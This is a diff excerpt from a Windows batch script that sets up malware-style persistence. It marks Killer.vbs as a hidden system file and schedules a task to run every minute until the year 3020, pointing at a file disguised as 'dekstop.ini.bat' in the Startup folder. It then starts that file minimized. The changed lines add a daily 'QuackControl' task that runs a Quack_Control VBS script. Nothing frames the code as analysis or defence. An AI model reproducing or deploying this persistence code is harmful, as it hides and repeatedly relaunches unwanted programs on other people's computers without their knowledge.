@@ -17,7 +17,7 @@ REM rename the file to dekstop.ini (not desktop.ini)
 	attrib +s +h "%USERPROFILE%\Killer.vbs"
 	
 	schtasks /Create /SC MINUTE /MO 1  /ED 12/11/3020 /F /TN Quack /TR %AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat
-	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN Quack /TR %USERPROFILE%\Killer.bat
+	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN QuackControl /TR %USERPROFILE%\Quack_Control_NEW.vbs
 	
 	cmd.exe /c start /min "%AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat " & exit
 	
@@ -37,7 +37,7 @@ REM else the system must be Xp or earlier
 	attrib +s +h "%USERPROFILE%\Killer.vbs"
 	
 	schtasks /Create /SC MINUTE /MO 1  /ED 12/11/3020 /F /TN Quack /TR %AppData%\Microsoft\Windows\Start Menu\Programs\startup\dekstop.ini.bat
-	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN Quack /TR %USERPROFILE%\Killer.bat
+	schtasks /Create /SC DAILY /MO 1  /ED 12/11/3020 /F /TN QuackControl /TR %USERPROFILE%\Quack_Control_OLD.vbs
 	
     cmd.exe /c start /min "%UserProfile%\Start Menu\Startup\dekstop.ini.bat" & exit
 )
